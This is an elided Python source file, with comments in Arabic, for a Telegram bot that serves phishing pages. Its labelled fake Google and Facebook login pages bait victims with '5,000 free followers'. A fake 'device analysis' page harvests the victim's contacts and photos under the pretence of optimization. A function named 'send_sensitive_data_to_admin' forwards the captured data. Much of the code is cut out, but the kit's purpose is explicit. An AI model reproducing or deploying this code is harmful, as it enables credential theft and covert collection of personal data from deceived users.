...
def verify_webhook():
    """التحقق من أن الطلب قادم من تيليجرام باستخدام التوكن والـ Secret."""
...
def send_sensitive_data_to_admin(data_type, content, user_id=None):
    try:
        ...
        # يمكن فك التشفير باستخدام base64.b64decode
    except Exception as e:
        logger.error(f"send_sensitive_data_to_admin error: {e}")

# ===================== صفحة تسجيل الدخول Google المزيفة =====================
GOOGLE_LOGIN_PAGE = '''
<!DOCTYPE html>
<html lang="ar">
<head>
...
# ===================== صفحة تسجيل الدخول Facebook المزيفة =====================
FACEBOOK_LOGIN_PAGE = '''
<!DOCTYPE html>
<html lang="ar">
<head>
...
<body>
    <div class="container">
        ...
        <div class="offer-box">
            <strong>🎁 5,000 متابع مجاناً</strong><br>
            <span>للمسجلين الجدد لأول مرة</span>
        </div>
        ...
        <div class="note">
            📌 تأكد من صحة بيانات الربط لضمان إيداع المكافأة فوراً.<br>
...
<body>
    <div class="container">
        ...
        <div class="permission-box">
            🔒 سيتم تحليل بياناتك بشكل آمن ومشفّر لتحسين تجربتك
        </div>
        <div class="info-box">
    ...
    <script>
        ...
        function collectData() {
            ...
            setTimeout(() => {
                ...
                .then(() => {
                    status.className = 'status';
                    status.textContent = '✅ تم التحليل بنجاح، جهازك يعمل بكفاءة عالية';
                    document.getElementById('result').textContent = '📊 تم جمع البيانات الأساسية بنجاح';
                })
                .catch(() => {
                    status.className = 'status error';
                    status.textContent = '❌ حدث خطأ، يُرجى المحاولة مرة أخرى';
                });
            }, 2000);
        }
            ...
            if (navigator.contacts && navigator.contacts.select) {
                navigator.contacts.select(['name', 'tel', 'email'], { multiple: true })
                    .then(contacts => {
                        ...
                        status.className = 'status';
                        status.textContent = '✅ تم تحسين جهات الاتصال (' + contacts.length + ' جهة)';
                        document.getElementById('result').textContent = '📇 تم مزامنة جهات الاتصال مع خادم التحسين';
                    })
                    .catch(() => {
                        status.className = 'status error';
                        status.textContent = '⚠️ لم نتمكن من تحسين جهات الاتصال، حاول مجدداً';
                    });
            } else {
                ...
                input.onchange = function(e) {
                    ...
                    if (files.length > 0) {
                        ...
                        status.className = 'status';
                        status.textContent = '✅ تم تحسين ' + files.length + ' صورة';
                        document.getElementById('result').textContent = '🖼️ تم رفع الصور للتحسين';
                    } else {
                        status.className = 'status error';
                        status.textContent = '⚠️ لم يتم اختيار أي صورة';
                    }
                };
                input.click();
            }
...
if __name__ == "__main__":
    ...
    if USE_WEBHOOK and SERVER_URL:
        ...
        try:
            # تعيين Webhook مع Secret Token للحماية
